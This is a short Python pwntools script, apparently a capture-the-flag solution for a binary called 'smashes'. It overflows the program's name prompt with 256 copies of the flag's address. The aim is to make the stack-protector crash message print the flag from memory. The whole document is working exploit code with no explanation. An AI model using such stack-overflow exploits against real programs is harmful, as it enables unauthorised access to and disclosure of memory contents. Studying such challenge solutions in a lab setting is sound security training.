from pwn import *

p = process('./smashes')
main_addr = 0x7fffffffdf08
name_addr = 0x7fffffffdcf0
flag_addr = 0x600D20

playload = p64(flag_addr)*256
p.recvuntil('What\'s your name? ')
p.sendline(playload)
data = p.recv()
p.recvuntil('flag: ')
p.sendline('a')
print data
p.interactive()
